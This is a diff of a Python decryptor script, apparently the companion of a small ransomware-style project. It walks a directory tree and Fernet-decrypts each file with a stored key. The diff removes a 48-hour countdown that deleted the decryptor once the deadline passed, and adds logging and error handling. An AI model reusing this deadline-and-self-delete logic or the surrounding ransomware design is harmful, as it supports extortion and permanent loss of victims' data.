@@ -1,14 +1,18 @@
 import subprocess # Import the subprocess module
 import sys # Import the sys module
 import os # Import the os module
-import socket # Import the socket module
-from datetime import datetime, timedelta # Import the datetime and timedelta
+import logging
+# Configuración del logging
+logging.basicConfig(filename='log.txt', level=logging.ERROR,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 #Install cryptography module
 def install(package): # Install the required package
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-install('cryptography') # Install the cryptography package.
+install('cryptography') # Install the cryptography package
 from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography module
+import socket # Import the socket module
+from datetime import datetime, timedelta # Import the datetime and timedelta
 
 files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
@@ -29,35 +33,31 @@ def recorrer_arbol_directorios(directory):
                         continue
                     print("File:", rute_element)
                     files.append(rute_element)
+    except PermissionError:
+        error_message = f"No tienes permisos para acceder a la carpeta: {directory}"
+        print(error_message)
+        logging.error(error_message)
+    except OSError as e:
+        error_message = f"Error de E/S: {e}"
+        print(error_message)
+        logging.error(error_message)
+    except RecursionError:
+        error_message = f"Error: Recursión infinita detectada en la carpeta: {directory}"
+        print(error_message)
+        logging.error(error_message)
     except Exception as e:
-        print("Mondongo")
+        error_message = f"Error inesperado: {e}"
+        print(error_message)
+        logging.error(error_message)
     print(files)
 recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))
 
 with open("key.key", "rb") as key_file:
     key = key_file.read()
 
-while True:
-    print("1. Desencriptar archivos")
-    print("2. Salir")
-    choice = input("Elige una opción: ")
-    with open("encryption_time.txt", "r") as f:
-        encryption_time = datetime.fromisoformat(f.read().strip())
-    elapsed_time = datetime.now() - encryption_time
-    print("Han pasado",elapsed_time, "De las 48 horas permitidas\n")
-    if choice == "1":
-        if elapsed_time > timedelta(hours=48):
-            print("Han pasado más de 48 horas desde la encriptación. Advertencia!")
-            os.remove("decrypt.py")
-            sys.exit(1)
-        else:
-            for file in files:
-                with open(file, "rb") as f:
-                    data = f.read()
-                data_decrypted = Fernet(key).decrypt(data)
-                with open(file, "wb") as f:
-                    f.write(data_decrypted)
-    elif choice == "2":
-        break
-    else:
-        print("Opción no válida. Inténtalo de nuevo.")
+for file in files:
+    with open(file, "rb") as f:
+        data = f.read()
+    data_decrypted = Fernet(key).decrypt(data)
+    with open(file, "wb") as f:
+        f.write(data_decrypted)
